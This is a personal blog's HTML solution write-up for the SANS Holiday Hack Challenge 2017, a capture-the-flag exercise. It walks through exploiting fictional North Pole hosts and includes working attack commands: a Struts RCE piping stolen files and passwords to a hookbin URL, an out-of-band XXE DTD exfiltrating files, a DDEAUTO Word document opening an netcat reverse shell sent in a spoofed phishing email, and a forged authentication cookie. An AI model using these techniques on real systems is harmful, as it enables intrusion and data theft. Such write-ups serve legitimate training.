@@ -1,0 +1,1218 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta itemprop="name" content="SANS Holiday Hack Challenge 2017 Solution">
+  <title>SANS Holiday Hack Challenge 2017 Solution</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta itemprop="description" content="Gnome in Your Home - The 2015 SANS Holiday Hack Challenge By Counter Hack &amp; Friends">
+
+  
+  <meta itemprop="keywords" content="ctf, sans, hhc" />
+  
+    <meta itemprop="wordCount" content="4994">
+  
+
+  <meta property="og:title" content="SANS Holiday Hack Challenge 2017 Solution" />
+  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="http://localhost:1313/blog/2018/01/SANS-Holiday-Hack-Challenge-2017-Solution/" />
+  
+
+  
+  <meta property="og:updated_time" content="2018-01-01 01:23:27 &#43;0000 UTC"/>
+  
+  
+  
+  
+
+  
+    <meta name="twitter:card" content="summary"/>
+  
+
+  
+  <meta name="twitter:title" content="SANS Holiday Hack Challenge 2017 Solution"/>
+  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
+  
+  
+
+  
+  
+  <link href="http://localhost:1313//css/bootstrap.min.css" rel="stylesheet">
+  <link href="http://localhost:1313//css/hc.css" rel="stylesheet">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313//css/zenburn.css" type="text/css" media="screen" />
+
+  
+
+  
+  <link rel="stylesheet" href="http://localhost:1313//lightbox/css/lightbox.css" type="text/css" media="screen">
+
+  <meta name="generator" content="Hugo 0.37.1" />
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  
+</head>
+
+
+  <body>
+
+  
+<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
+  <div id = "wrapper">
+
+<div class="navbar navbar-default" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a href="http://localhost:1313//"><p class="navbar-brand">camelinc</p></a>
+        </div>
+
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+					
+          <h2>http://localhost:1313/</h2>
+					
+					<li><a href="http://localhost:1313/about">About </a></li>
+					
+					<li><a href="http://localhost:1313/post">Posts </a></li>
+					
+          </ul>
+        </div>
+      </div>
+    </div>
+
+       
+       <div id="sidebar-wrapper">
+        <ul class="sidebar-nav">
+					<img src="/img/avatar.png" />
+          <li class="sidebar-brand"><a href="http://localhost:1313//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
+          <hr />
+
+					
+						<li><a href="http://localhost:1313/about">About </a></li>
+					
+						<li><a href="http://localhost:1313/post">Posts </a></li>
+					
+          <hr />
+
+          <div id="social-wrapper">
+           
+             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
+           
+
+           
+             
+           
+
+           
+             
+           
+
+           
+             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
+           
+         </div>
+
+       </ul>
+     </div>
+
+     <div class="container">
+
+
+  <div id="article">
+    <div class="article-title">SANS Holiday Hack Challenge 2017 Solution</div>
+    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2018-01-01</small></p> <hr/>
+    <div class="post">
+      
+
+<h1 id="hacking-the-northpolechristmastown">Hacking the Northpolechristmastown</h1>
+
+<h2 id="l2s-northpolechristmastown-com">l2s.northpolechristmastown.com</h2>
+
+<p>Letters to Santa app contains a reference to a development system in a HTML comment section.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- Development version --&gt;</span>
+<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://dev.northpolechristmastown.com&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: none;&#34;</span><span class="p"></span><span class="p">&gt;</span>Access Development Version<span class="p">&lt;</span><span class="p">/</span><span class="nt">a</span><span class="p">&gt;</span></code></pre></div>
+
+<h3 id="exploiting-apache-struts">Exploiting Apache Struts</h3>
+
+<p>The development interface is based on Apache struts.
+The utilized version is vulnerable to CVE 2017-9805.
+A respective script can be found on <a href="https://github.com/chrisjd20/cve-2017-9805.py/blob/master/cve-2017-9805.py">github</a>.</p>
+
+<p>The script can execute a user supplied command.
+For a little feedback, the response is uploaded to hookbin.
+A hint from Sparkle indicates, that the developer might have stored credentials in clear text.
+With a quick search they can be discovered in the source code of the letters to santa app.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span class="s1">&#39;echo &#34;test=$(ls -larthR /home/alabaster_snowball | base64 -w0 - &amp;&amp; echo &#34;||&#34; &amp;&amp; find /opt -name &#34;*.class&#34; -type f -exec grep -i -C2 password {} \; | base64 -w0 - )&#34; | curl -d @- https://hookb.in/Kb8BRDkw&#39;</span></code></pre></div>
+
+<div class="highlight"><pre class="chroma"><code class="language-Java" data-lang="Java">    <span class="kd">final</span> <span class="n">String</span> <span class="n">host</span> <span class="o">=</span> <span class="s">&#34;localhost&#34;</span><span class="o">;</span>
+    <span class="kd">final</span> <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="s">&#34;alabaster_snowball&#34;</span><span class="o">;</span>
+    <span class="kd">final</span> <span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="s">&#34;stream_unhappy_buy_loss&#34;</span><span class="o">;</span>
+    <span class="n">String</span> <span class="n">connectionURL</span> <span class="o">=</span> <span class="s">&#34;jdbc:mysql://&#34;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s">&#34;:3306/db?user=;password=&#34;</span><span class="o">;</span>
+    <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="n">Statement</span> <span class="n">statement</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span></code></pre></div>
+
+<p>The credentials grants access to the SSH service.</p>
+
+<h3 id="attacking-the-network">Attacking the Network</h3>
+
+<p>After logging in via SSH we are placed in a restricted shell.
+Alongside some other tools the system has nmap available.
+With that we can scan the internal network for other hosts.</p>
+
+<pre><code>Host: 10.142.0.2 (hhc17-l2s-proxy.c.holidayhack2017.internal)   Ports: 22/open/tcp//ssh//OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)/, 80/open/tcp//http//nginx 1.10.3/, 443/open/tcp//ssl|http//nginx 1.10.3/, 2222/open/tcp//ssh//OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)/    Ignored State: closed (65531)
+Host: 10.142.0.3 (hhc17-apache-struts1.c.holidayhack2017.internal)  Ports: 22/open/tcp//ssh//OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)/, 80/open/tcp//http//nginx 1.10.3/   Ignored State: closed (65533)
+Host: 10.142.0.5 (mail.northpolechristmastown.com)  Ports: 22/open/tcp//ssh//OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.10.3 (Ubuntu)/, 143/open/tcp//imap//Dovecot imapd/, 2525/open/tcp//smtp//Postfix smtpd/, 3000/open/tcp//http//Node.js Express framework/  Ignored State: closed (65529)
+Host: 10.142.0.6 (edb.northpolechristmastown.com)   Ports: 22/open/tcp//ssh//OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)/, 80/open/tcp//http//nginx 1.10.3/, 389/open/tcp//ldap?///, 8080/open/tcp//http//Werkzeug httpd 0.12.2 (Python 2.7.13)/  Ignored State: closed (65531)
+Host: 10.142.0.7 (hhc17-smb-server.c.holidayhack2017.internal)  Ports: 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 445/open/tcp//microsoft-ds//Microsoft Windows Server 2008 R2 - 2012 microsoft-ds/, 3389/open/tcp//ssl|ms-wbt-server?///, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 5986/open/tcp//ssl|http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 49666/open/tcp//msrpc//Microsoft Windows RPC/, 49668/open/tcp//msrpc//Microsoft Windows RPC/  Ignored State: filtered (65527)
+Host: 10.142.0.8 (hhc17-emi.c.holidayhack2017.internal) Ports: 80/open/tcp//http//Microsoft IIS httpd 10.0/, 3389/open/tcp//ssl|ms-wbt-server?///, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 5986/open/tcp//ssl|http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/ Ignored State: filtered (65531)
+Host: 10.142.0.11 (hhc17-apache-struts2.c.holidayhack2017.internal) Ports: 22/open/tcp//tcpwrapped///, 80/open/tcp//http//nginx 1.10.3/, 18281/open/tcp//tcpwrapped///, 44665/open/tcp///// Ignored State: closed (65531)
+Host: 10.142.0.13 (eaas.northpolechristmastown.com) Ports: 80/open/tcp//http//Microsoft IIS httpd 10.0/, 3389/open/tcp//ssl|ms-wbt-server?///, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 5986/open/tcp//ssl|http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/ Ignored State: filtered (65531)
+</code></pre>
+
+<h2 id="10-142-0-7">10.142.0.7</h2>
+
+<p>The system has got a SMB service running on the internal network.
+In order to access that service a local port forwarding has to be created.</p>
+
+<pre><code>ssh alabaster_snowball@l2s.northpolechristmastown.com -L :445:10.142.0.7:445
+</code></pre>
+
+<p>With remote access to the SMB service enabled the usual tools of trade can be harnessed.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/smbclient.png" data-lightbox="default" data-title="Connecting to the samba fileserver." >
+        <img src="/img/post/2018/holidayhack/smbclient.png" alt="Connecting to the samba fileserver." >
+    </a>
+</figure>
+
+
+
+<pre><code>smbclient -L localhost -u alabaster_snowball
+</code></pre>
+
+<p>The server provides a file share with the name FileStor.
+The easiest way to access the shared drive is to directly mount it.</p>
+
+<pre><code>mount -t cifs -o username=alabaster_snowball,password=stream_unhappy_buy_loss //localhost/FileStor /mnt/foo 
+</code></pre>
+
+<p>Voila, Great Page 3 is present on the share, along with some other documents.</p>
+
+<h2 id="mail-northpolechristmastown-com">mail.northpolechristmastown.com</h2>
+
+<p>Pepper indicates in a hint that the Alabaster implemented his own encryption schema based on AES256.
+Implementing your own crypto is alwaysa bad idea.
+During the initial information gathering phase a cookie.txt file is referenced in the robots.txt file.
+The referenced file includes an excerpt of the implemented cookie mechanism.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">//FOUND THESE FOR creating and validating cookies. Going to use this in node js
+</span><span class="c1"></span>    <span class="kd">function</span> <span class="nx">cookie_maker</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">callback</span><span class="p">){</span>
+        <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="s1">&#39;need to put any length key in here&#39;</span><span class="p">;</span>
+        <span class="c1">//randomly generates a string of 5 characters
+</span><span class="c1"></span>        <span class="kd">var</span> <span class="nx">plaintext</span> <span class="o">=</span> <span class="nx">rando_string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="c1">//makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
+</span><span class="c1"></span>        <span class="c1">//Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
+</span><span class="c1"></span>        <span class="kd">var</span> <span class="nx">ciphertext</span> <span class="o">=</span> <span class="nx">aes256</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">plaintext</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\=/g</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+        <span class="c1">//Setting the values of the cookie.
+</span><span class="c1"></span>        <span class="kd">var</span> <span class="nx">acookie</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;IOTECHWEBMAIL&#39;</span><span class="p">,</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&#34;name&#34;</span><span class="o">:</span><span class="nx">username</span><span class="p">,</span> <span class="s2">&#34;plaintext&#34;</span><span class="o">:</span><span class="nx">plaintext</span><span class="p">,</span>  <span class="s2">&#34;ciphertext&#34;</span><span class="o">:</span><span class="nx">ciphertext</span><span class="p">}),</span> <span class="p">{</span> <span class="nx">maxAge</span><span class="o">:</span> <span class="mi">86400000</span><span class="p">,</span> <span class="nx">httpOnly</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">encode</span><span class="o">:</span> <span class="nb">String</span> <span class="p">}]</span>
+        <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">acookie</span><span class="p">);</span>
+    <span class="p">};</span>
+    <span class="kd">function</span> <span class="nx">cookie_checker</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">callback</span><span class="p">){</span>
+        <span class="k">try</span><span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="s1">&#39;need to put any length key in here&#39;</span><span class="p">;</span>
+            <span class="c1">//Retrieving the cookie from the request headers and parsing it as JSON
+</span><span class="c1"></span>            <span class="kd">var</span> <span class="nx">thecookie</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">IOTECHWEBMAIL</span><span class="p">);</span>
+            <span class="c1">//Retrieving the cipher text 
+</span><span class="c1"></span>            <span class="kd">var</span> <span class="nx">ciphertext</span> <span class="o">=</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">ciphertext</span><span class="p">;</span>
+            <span class="c1">//Retrievingin the username
+</span><span class="c1"></span>            <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">name</span>
+            <span class="c1">//retrieving the plaintext
+</span><span class="c1"></span>            <span class="kd">var</span> <span class="nx">plaintext</span> <span class="o">=</span> <span class="nx">aes256</span><span class="p">.</span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">ciphertext</span><span class="p">);</span>
+            <span class="c1">//If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
+</span><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nx">plaintext</span> <span class="o">===</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">plaintext</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">username</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+</code></pre></div>
+
+<p>The code makes use of <a href="https://www.npmjs.com/package/aes256">aes256</a>.
+This library creates a random IV during encryption.
+Furthermore, the key is hashed with SHA-256 before the encryption.
+Finally, the IV is prepended to the encrypted string.
+In a hint Pepper asks &ldquo;What happens if the encrypted string is only 16 bytes long?&rdquo;.
+The original nodejs library verifies that encrypted string is at least 17 bytes <a href="https://github.com/JamesMGreene/node-aes256/blob/master/index.js#L67">aes256:67</a>.
+That might be a hint to gain access to the mail system.</p>
+
+<p>In the particular example the decrypted string is verified against a user supplied plaintext.
+Let&rsquo;s simply try the 16 bytes version.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="n">IV</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;0000000000000000&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">IV</span><span class="p">)</span></code></pre></div>
+
+<p>The resulting encoded string might be accepted by the application.
+Paste that into the request an see if it is working.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/Testing_JWT_token.png" data-lightbox="default" data-title="Testing the JWT token." >
+        <img src="/img/post/2018/holidayhack/Testing_JWT_token.png" alt="Testing the JWT token." >
+    </a>
+</figure>
+
+
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">curl -i -s -k  -X <span class="s1">$&#39;GET&#39;</span> <span class="se">\
+</span><span class="se"></span>    -b <span class="s1">$&#39;EWA={\&#34;name\&#34;:\&#34;alabaster.snowball@northpolechristmastown.com\&#34;,\&#34;plaintext\&#34;:\&#34;\&#34;,\&#34;ciphertext\&#34;:\&#34;MDAwMDAwMDAwMDAwMDAwMA==\&#34;}&#39;</span> <span class="se">\
+</span><span class="se"></span>    <span class="s1">$&#39;http://mail.northpolechristmastown.com/account.html&#39;</span></code></pre></div>
+
+<p>That worked!
+With access to the mail account of alabaster we can take a look at his emails.
+In one message the Great Book Page 4 is referenced and can be downloaded from the system <a href="http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf">link</a>.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/mail_with_page.png" data-lightbox="default" data-title="The mail with a reference to the Great Book Page." >
+        <img src="/img/post/2018/holidayhack/mail_with_page.png" alt="The mail with a reference to the Great Book Page." >
+    </a>
+</figure>
+
+
+
+<h3 id="accounts">Accounts</h3>
+
+<p>With some manual research the following Accounts send or receive a mail at some point.
+They might be valuable in a later stage of the story.</p>
+
+<pre><code>alabaster.snowball@northpolechristmastown.com
+support@northpolechristmastown.com
+admin@northpolechristmastown.com
+jessica.claus@northpolechristmastown.com
+all@northpolechristmastown.com
+mary.sugerplum@northpolechristmastown.com
+sparkle.redberry@northpolechristmastown.com
+pepper.minstix@northpolechristmastown.com
+tarpin.mcjinglehauser@northpolechristmastown.com
+wunorse.openslae@northpolechristmastown.com
+minty.candycane@northpolechristmastown.com (HTML)
+reindeer@northpolechristmastown.com
+</code></pre>
+
+<h2 id="eaas-northpolechristmastown-com">eaas.northpolechristmastown.com</h2>
+
+<p>Sugarplum indicates that the service processes user supplied XML files.
+Also, Sugarplum mentions an <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities/">article</a> on the SANS Pentesting blog covering XML External Entity Injection.
+This kind of attack allows reads of arbitrary files that can be exfiltrated with a corresponding DTD file (see <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">Out-of-band XML External Entity (OOB-XXE)</a>).</p>
+
+<p>In order to exploit the vulnerability the DTD file has to be accessible from the target system.
+The easiest thing is to create the file on the l2s system that we already have shell access to and open up a webserver.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> -e <span class="s2">&#34;&lt;?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?&gt;\n&lt;\x21ENTITY % stolendata SYSTEM \x22file:///c:/greatbook.txt\x22&gt;\n&lt;\x21ENTITY % inception \x22&lt;\x21ENTITY \x26\x23x25; sendit SYSTEM \x27http://10.142.0.3:8123/?%stolendata;\x27&gt;\x22&gt;&#34;</span> <span class="p">|</span> tee evil.dtd
+nc -lnvp <span class="m">8123</span></code></pre></div>
+
+<p>After preparing everything we can send the XML with the DTD reference to the target system in order to trigger the XXE injection.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">curl -i -s -k  -X <span class="s1">$&#39;POST&#39;</span> <span class="se">\
+</span><span class="se"></span>    -H <span class="s1">$&#39;Host: eaas.northpolechristmastown.com&#39;</span> <span class="se">\
+</span><span class="se"></span>    -H <span class="s1">$&#39;Content-Type: multipart/form-data; boundary=---------------------------199407962719084731591387759358&#39;</span> <span class="se">\
+</span><span class="se"></span>    -H <span class="s1">$&#39;Content-Length: 424&#39;</span> -H <span class="s1">$&#39;Cookie: ASP.NET_SessionId=nns1453hywr1wkzrwqucc5fa&#39;</span> <span class="se">\
+</span><span class="se"></span>    --data-binary <span class="s1">$&#39;-----------------------------199407962719084731591387759358\x0d\x0aContent-Disposition: form-data; name=\&#34;file\&#34;; filename=\&#34;evil.xml\&#34;\x0d\x0aContent-Type: text/xml\x0d\x0a\x0d\x0a&lt;?xml version=\&#34;1.0\&#34; encoding=\&#34;utf-8\&#34;?&gt;\x0a&lt;!DOCTYPE demo [\x0a     &lt;!ELEMENT demo ANY &gt;\x0a     &lt;!ENTITY % extentity SYSTEM \&#34;http://10.142.0.3:8123/evil.dtd\&#34;&gt;\x0a     %extentity;\x0a     %inception;\x0a     %sendit;\x0a     ]\x0a&gt;\x0d\x0a-----------------------------199407962719084731591387759358--\x0d\x0a&#39;</span> <span class="se">\
+</span><span class="se"></span>    <span class="s1">$&#39;http://eaas.northpolechristmastown.com/Home/DisplayXml&#39;</span></code></pre></div>
+
+<p>After the request the target system loads the DTD file.
+As soon as the definition is processed the contents of the file defined in the dtd will be sent back to the target server as a GET request.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/XXE_connection.png" data-lightbox="default" data-title="The DTD is loaded and the file contents is sent." >
+        <img src="/img/post/2018/holidayhack/XXE_connection.png" alt="The DTD is loaded and the file contents is sent." >
+    </a>
+</figure>
+
+
+
+<p>The file includes a reference to the next page of the Great Book.</p>
+
+<h2 id="emi-northpolechristmastown-com">emi.northpolechristmastown.com</h2>
+
+<p>The hints from Shinny indicate that the target can only be attacked via a client side attack.
+Looking through Alabaster&rsquo;s mailbox points out that he is looking for a cookie recipe.
+He is probably looking for a mail with a text that includes &ldquo;More recipies for gingerbread cookies&rdquo;.</p>
+
+<p>One mail on the mailserver mentions a document that is used to open the calculator for Wunorse.
+A corresponding file is present on the samba file share that was previously exploited.
+The Word document makes use of the DDEAUTO action to open the calculator.
+In order to exploit this the command line has to be adjusted.
+Luckily, another mail mentions that alabaster installed nc.exe on the machine.
+This simplifies the whole process quite a bit as we can probably open a reverse shell with netcat.</p>
+
+<p>As Word was not available prepare the payload document another method was utilized.
+A Docx file is basically a zipped XML file that can be edited manually.
+In order to adjust the payload the following commands perform the job.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">mkdir dde
+<span class="nb">cd</span> dde/
+unzip ../MEMO - Calculator Access <span class="k">for</span> Wunorse.docx
+DDEAUTO c:<span class="se">\\</span>windows<span class="se">\\</span>system32<span class="se">\\</span>cmd.exe <span class="s2">&#34;/k nc -nv 10.142.0.3 8123 -e cmd.exe&#34;</span>
+zip -r ../rezipped.docx *</code></pre></div>
+
+<p>After the the payload document is ready the last preparation step is to start a  listener in order to receive the reverse shell.
+As soon as everything is ready upload the payload document and send the phishing mail out to poor alabaster.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">curl -i -s -k  -X <span class="s1">$&#39;POST&#39;</span> <span class="se">\
+</span><span class="se"></span>    -H <span class="s1">$&#39;Host: mail.northpolechristmastown.com&#39;</span> -H <span class="s1">$&#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#39;</span> -H <span class="s1">$&#39;X-Requested-With: XMLHttpRequest&#39;</span> -H <span class="s1">$&#39;Content-Length: 575&#39;</span> -H <span class="s1">$&#39;Cookie: EWA={\&#34;name\&#34;:\&#34;jessica.claus@northpolechristmastown.com\&#34;,\&#34;plaintext\&#34;:\&#34;\&#34;,\&#34;ciphertext\&#34;:\&#34;MDAwMDAwMDAwMDAwMDAwMA==\&#34;}&#39;</span> <span class="se">\
+</span><span class="se"></span>    -b <span class="s1">$&#39;EWA={\&#34;name\&#34;:\&#34;jessica.claus@northpolechristmastown.com\&#34;,\&#34;plaintext\&#34;:\&#34;\&#34;,\&#34;ciphertext\&#34;:\&#34;MDAwMDAwMDAwMDAwMDAwMA==\&#34;}&#39;</span> <span class="se">\
+</span><span class="se"></span>    --data-binary <span class="s1">$&#39;from_email=jessica.claus%40northpolechristmastown.com&amp;to_email=alabaster.snowball%40northpolechristmastown.com&amp;subject_email=More+recipies+for+gingerbread+cookies&amp;message_email=54686520626573742072656369706520666f722067696e676572627265616420636f6f6b696520796f752063616e206765742e2041545441434845442046494c4520444f574e4c4f414420484552453a20687474703a2f2f6d61696c2e6e6f727468706f6c656368726973746d6173746f776e2e636f6d2f6174746163686d656e74732f6273554b5548594c6c3054793730735a626d726539627457674e6c7641475748374d316f365263453375697252366f6b43465f5f72657a69707065642e646f63780a20&#39;</span> <span class="se">\
+</span><span class="se"></span>    <span class="s1">$&#39;http://mail.northpolechristmastown.com/api.js&#39;</span></code></pre></div>
+
+<p>After a few moments the system should connect back to the listener.</p>
+
+
+
+<figure class="fcenter">
+    <a href="/img/post/2018/holidayhack/emi_reverse_shell.png" data-lightbox="default" data-title="The target system opens a reverse netcat shell to the attacking machine." >
+        <img src="/img/post/2018/holidayhack/emi_reverse_shell.png" alt="The target system opens a reverse netcat shell to the attacking machine." >
+    </a>
+</figure>
+
+
+
+<h3 id="download-book-page">Download Book Page</h3>
+
+<p>The goal on the system is to download another page from the Great Book.
+One easy solution is to simply open webserver via python on the victim machine in the root directory.</p>
+
+<pre><code>C:\PROGRA~1\Python36\python.exe -m http.server 8124
+</code></pre>
+
+<p>The page is then available at the following URI.</p>
+
+<pre><code>http://10.142.0.8:8124/GreatBookPage7.pdf
+</code></pre>
+
+<h3 id="information-gathering">Information Gathering</h3>
+
+<p>The system is an up to date Windows 10 virtual machine.</p>
+
+<pre><code>OS Name:                   Microsoft Windows Server 2016 Datacenter
+OS Version:                10.0.14393 N/A Build 14393
+</code></pre>
+
+<p>Commands are probably executed via the following python script.
+The file cannot be opened by the current user.</p>
+
+<pre><code>C:\PROGRA~1\WindowsGrabber\alabaster_snowball.py
+</code></pre>
+
+<p>In the same directory also exists another file &lsquo;execute.ps1&rsquo;.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="k">function</span> <span class="n">exec</span> <span class="p">{</span>
+    <span class="nv">$the_file</span> <span class="p">=</span> <span class="s1">&#39;.\file.txt&#39;</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$line</span> <span class="k">in</span> <span class="nb">Get-Content</span> <span class="nv">$the_file</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$job</span>  <span class="p">=</span> <span class="nb">Start-Job</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="n">iex</span><span class="p">(</span><span class="nv">$p</span><span class="p">)}</span> <span class="n">-Arg</span> <span class="nv">$line</span>
+    <span class="p">}</span>
+    <span class="nb">Clear-Content</span> <span class="nv">$the_file</span>
+<span class="p">}</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">exec</span>
+    <span class="nb">Start-Sleep</span> <span class="n">-s</span> <span class="n">10</span>
+<span class="p">}</span></code></pre></div>
+
+<p>The reason for this file can only be speculated.</p>
+
+<h2 id="edb-northpolechristmastown-com">edb.northpolechristmastown.com</h2>
+
+<p>Information gathering shows that the elf database is based on Materialize CSS.
+The default credentials for alabaster do not grant access to the portal.
+In the source code the following JavaScript snippet provides some hints regarding the authorization.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">token</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">&#34;np-auth&#34;</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">user_json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))</span>
+</code></pre></div>
+
+<p>Here a token is stored in the localStorage.
+According to a hint from Wunorse the password reset might be vulnerable to a XSS vulnerability.</p>
+
+<h3 id="steal-cookies-and-localstorage">steal cookies and localStorage</h3>
+
+<p>Testing the password request shows that script tags are filtered.
+This confirms that Alabaster implemented some kind of security filter as Wunrose also indicated.</p>
+
+<h4 id="steal-cookies-and-localstorage-1">Steal Cookies and localStorage</h4>
+
+<p>After some tweaking, the following payload sends cookies and localStorage back to the attacker.</p>
+
